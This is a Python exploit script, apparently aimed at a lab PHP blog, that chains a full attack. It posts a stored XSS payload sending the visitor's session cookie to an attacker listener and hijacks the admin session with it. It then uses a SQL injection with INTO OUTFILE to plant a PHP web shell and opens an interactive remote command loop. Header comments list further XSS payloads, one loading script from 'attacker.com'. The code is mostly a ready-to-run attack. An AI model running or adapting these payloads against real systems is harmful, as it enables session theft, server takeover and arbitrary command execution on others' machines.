# Payloads
#  <svg onload=alert(1)>
#  <svg/onload=jQuery.getScript(‘http://attacker.com/xss.js’)>

# var xss = document.createElement('img');
# xss.src="http://example.com";

import requests
import re
import socket
from random import randint
import sys
import os

r = requests.Session()

target_url = "http://192.168.0.5/"

attacker_ip = "192.168.0.9"  # FOR xss

os.system("clear")


def trigger():
    print("[+] Creating xss vector")
    port = randint(5000, 9000)
    vector = "<script>document.location='http://{}:{}/' +escape(document.cookie)</script>".format(
        attacker_ip, port)
    print("[+] Sending xss vector")
    sender(vector, port)


def servers(port):
    HOST = ''
    with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as s:
        s.bind((HOST, port))
        s.listen(1)
        conn, addr = s.accept()
        with conn:
            m = conn.recv(2048)
            print("[+] xss triggered capturing cookies to login")
            out = re.findall("PHPSESSID\%3D.*HTTP", m.decode('utf-8'))
            out = out[0].replace("PHPSESSID%3D", "").replace("HTTP", "")
            return (out.replace("\n", "").replace("\t", ""))


def sender(xss, port):
    url = target_url+"post_comment.php?id=1"
    data = {'title': 'lolzz', 'author': 'aaa', 'text': xss, 'submit': 'Submit'}
    proxy = {'http': '127.0.0.1:8080'}
    out = r.post(url, data=data)
    if out.status_code == 200:
        print("[+] xss payload sent Successful")
        cookie = servers(port)
        login_admin(cookie)


def login_admin(cookie):
    url = target_url+"admin/index.php"
    cookie = "PHPSESSID={}".format(cookie)
    head = {'User-Agent': 'Mozilla/5.0 (X11; Linux x86_64; rv:67.0) Gecko/20100101 Firefox/67.0',
            'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8',
            'Accept-Language': 'en-US,en;q=0.5',
            'Accept-Encoding': 'gzip, deflate',
            'Connection': 'close',
            'Cookie': cookie}

    proxy = {'http': '127.0.0.1:8080'}
    a = r.get(url, headers=head)
    if a.text.find("Administration of my Blog"):
        print("[+] Login Successful")
        shell_upload(r, head)
    else:
        print("[-] Login Failed")
        sys.exit()


def shell_upload(r, head):

    url = target_url + \
        "admin/edit.php?id=-1%20union%20select%20\"<?php\",\"system($_GET[%27c%27]);\",\"?>\",\";\"%20into%20outfile%20\"/var/www/css/lol.php\"%23"
    # url=target_url+"admin/"
    r.get(url, headers=head)
    shell_url = url+"css/lol.php"
    test = r.get(shell_url, headers=head)
    if test.text.find("Notice: Undefined index:"):
        print("[+] Shell uploaded")
        shell_interact(r, head)
    else:
        print("[-] Shell upload failed")
        sys.exit()


def shell_interact(r, head):
    proxy = {'http': '127.0.0.1:8080'}
    shell_url = target_url+"css/lol.php"
    while True:
        cmd = input("cmd>")
        if cmd == "exit":
            url = shell_url+"?c=rm lol.php"
            r.get(url)
            sys.exit()
        else:
            url = shell_url+"?c={}".format(cmd)
        print(r.get(url, headers=head).text.replace(";", ""))


trigger()
